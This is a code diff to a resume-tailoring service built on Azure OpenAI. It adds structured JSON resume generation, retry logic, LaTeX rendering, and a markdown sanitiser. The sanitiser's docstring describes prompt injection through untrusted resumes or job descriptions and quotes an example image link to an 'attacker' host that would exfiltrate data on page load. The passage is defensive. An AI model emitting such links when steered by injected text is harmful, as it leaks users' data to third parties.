@@ -14,10 +14,25 @@ from urllib.parse import parse_qs, urlparse
 from dotenv import load_dotenv
 from openai import AzureOpenAI
 
+from api.services.latex_templates import render_all
+from api.services.resume_data import Resume, parse_resume_json, to_markdown
+
 load_dotenv()
 
 SETTINGS_PATH = Path(__file__).resolve().parents[2] / "config" / "settings.json"
 DEFAULT_API_VERSION = "2025-03-01-preview"
+MOCK_RESUME = Resume.model_validate({
+    "name": "Sample Candidate", "headline": "Mock resume: no Azure OpenAI credentials are configured",
+    "email": "sample@example.com", "phone": "+1 555 0100", "location": "Anywhere",
+    "links": [{"label": "example.com/sample", "url": "https://example.com/sample"}],
+    "summary": "This is sample content so the templates can be previewed without calling the model.",
+    "sections": [
+        {"title": "Skills", "skills": [{"label": "Languages", "items": "Python, SQL"}]},
+        {"title": "Experience", "entries": [{"title": "Software Engineer", "organization": "Example Corp", "location": "Remote",
+                                             "dates": "2022 - Present", "bullets": ["Built and shipped an API used by 10,000 people."]}]},
+        {"title": "Education", "entries": [{"title": "BSc Computer Science", "organization": "Example University", "dates": "2018 - 2022"}]},
+    ],
+})
 # Caps the model bill per request; reasoning tokens count toward it, so it is generous.
 MAX_OUTPUT_TOKENS = 8000
 SECURITY_BOUNDARY = (
@@ -41,6 +56,29 @@ def _tidy_markdown(text: str, demote_headings: bool = False) -> str:
     text = re.sub(r"(?m)([^\n])\n(#{1,6}[ \t])", r"\1\n\n\2", text)
     text = re.sub(r"(?m)^(#{1,6}[ \t][^\n]*)\n(?=[^\n])", r"\1\n\n", text)
     return re.sub(r"\n{3,}", "\n\n", text)
+
+
+_MD_IMAGE = re.compile(r"!\[[^\]]*\]\([^)]*\)|!\[[^\]]*\]\[[^\]]*\]|<img\b[^>]*>", re.IGNORECASE)
+_MD_LINK = re.compile(r"\[([^\]]+)\]\(\s*([^)\s]+)[^)]*\)")
+_MD_REF_DEFINITION = re.compile(r"(?m)^\s*\[[^\]]+\]:\s*\S+.*$")
+
+
+def _neutralize_markdown(text: str) -> str:
+    """The report is model output and the model reads untrusted documents, so it may be steered into
+    emitting `![x](https://attacker/?q=...)`, which the browser would fetch with no click. Drop images
+    and show links as plain 'text (url)' so a disguised link can't hide its destination."""
+    text = _MD_IMAGE.sub("", text)
+    text = _MD_REF_DEFINITION.sub("", text)
+    return _MD_LINK.sub(r"\1 (\2)", text)
+
+
+def _count_source_bullets(text: str) -> int:
+    """Lines of the extracted resume that look like bullet points."""
+    return len(re.findall(r"(?m)^\s*[-\u2022*\u25aa\u25e6]\s+\S", text))
+
+
+def _count_bullets(resume: Resume) -> int:
+    return sum(len(e.bullets) for s in resume.sections for e in s.entries)
 
 
 def _terms(text: str) -> set:
@@ -159,7 +197,7 @@ class LLMAnalyzer:
             scores[key] = score
         return report, scores
 
-    def _call_llm(self, system_prompt: str, user_message: str) -> str:
+    def _call_llm(self, system_prompt: str, user_message: str, json_output: bool = False) -> str:
         """Dispatch a single-turn prompt to Azure OpenAI, handling both the Responses
         API (required for gpt-5-mini) and the standard Chat Completions API."""
         client = self.client
@@ -173,6 +211,7 @@ class LLMAnalyzer:
                 ],
                 reasoning={"effort": "low"},
                 max_output_tokens=MAX_OUTPUT_TOKENS,
+                **({"text": {"format": {"type": "json_object"}}} if json_output else {}),
             )
             return response.output_text or ""
 
@@ -183,6 +222,7 @@ class LLMAnalyzer:
                 {"role": "user", "content": user_message},
             ],
             max_completion_tokens=MAX_OUTPUT_TOKENS,
+            **({"response_format": {"type": "json_object"}} if json_output else {}),
         )
         return response.choices[0].message.content or ""
 
@@ -205,7 +245,7 @@ class LLMAnalyzer:
                 provider, model = "Mock", "mock"
             elapsed = time.time() - start_time
 
-            report, scores = self._ensure_scores(_tidy_markdown(report, demote_headings=True), safe_resume, safe_jd)
+            report, scores = self._ensure_scores(_neutralize_markdown(_tidy_markdown(report, demote_headings=True)), safe_resume, safe_jd)
             self.logger.info(f"Analysis by {model} took {elapsed:.2f}s — {len(report)} chars (content not logged).")
             return report, {
                 "llm_provider": provider,
@@ -223,32 +263,48 @@ class LLMAnalyzer:
     def generate_tailored_resume(
         self, extracted_text: str, job_description: str
     ) -> Tuple[Optional[str], dict]:
-        """Rewrite the resume's content to align with a job description while keeping
-        its original template (section order, headings, structure) unchanged."""
+        """Rewrite the resume's content to align with a job description, keeping its sections.
+        Returns (markdown, metadata); metadata["latex"] holds the same resume in every LaTeX template.
+        The model only produces validated data: all Markdown and LaTeX is rendered by our own code."""
         try:
             prompts = self.settings["resume_generation_prompts"]
             safe_resume, safe_jd = self._prepare(extracted_text, job_description)
 
             if not self.client:
-                # Return the original rather than fabricating a plausible-looking rewrite.
-                return (
-                    f"{safe_resume}\n\n---\n_Mock response: no Azure OpenAI credentials are configured, "
-                    "so the original resume is returned unmodified._",
-                    {"llm_provider": "Mock", "model_used": "mock"},
-                )
+                # Return a clearly labelled sample rather than fabricating a rewrite of the real resume.
+                return self._finish_resume(MOCK_RESUME, "Mock", "mock", 0.0)
 
             user_message = prompts["generation_template"].format(
                 job_description=safe_jd, resume_text=safe_resume
             ) + SECURITY_BOUNDARY
             start_time = time.time()
-            generated_resume = self._call_llm(prompts["system_role"], user_message)
+            resume, source_bullets = None, _count_source_bullets(safe_resume)
+            for attempt in (1, 2):  # at most one retry: unusable reply, or bullet points went missing
+                raw = self._call_llm(prompts["system_role"], user_message, json_output=True)
+                try:
+                    candidate = parse_resume_json(raw)
+                except ValueError as e:
+                    self.logger.warning(f"Resume generation attempt {attempt} returned unusable output: {e}")
+                    continue
+                if resume is None or _count_bullets(candidate) > _count_bullets(resume):
+                    resume = candidate
+                if _count_bullets(resume) >= source_bullets:
+                    break
+                self.logger.warning(f"Resume generation attempt {attempt} dropped bullet points; retrying once.")
             elapsed = time.time() - start_time
-            self.logger.info(f"Resume generation took {elapsed:.2f}s — {len(generated_resume)} chars (content not logged).")
-            return _tidy_markdown(generated_resume), {
-                "llm_provider": "AzureOpenAI",
-                "model_used": self.deployment_name,
-                "response_time_s": round(elapsed, 2),
-            }
+            if resume is None:
+                return None, {"llm_provider": "Failed"}
+            self.logger.info(f"Resume generation took {elapsed:.2f}s (content not logged).")
+            return self._finish_resume(resume, "AzureOpenAI", self.deployment_name, elapsed)
         except Exception as e:
             self.logger.error(f"Error during resume generation: {type(e).__name__}: {e}")
             return None, {"llm_provider": "Failed"}
+
+    @staticmethod
+    def _finish_resume(resume: Resume, provider: str, model: str, elapsed: float) -> Tuple[str, dict]:
+        return to_markdown(resume), {
+            "llm_provider": provider,
+            "model_used": model,
+            "response_time_s": round(elapsed, 2),
+            "latex": render_all(resume),
+        }
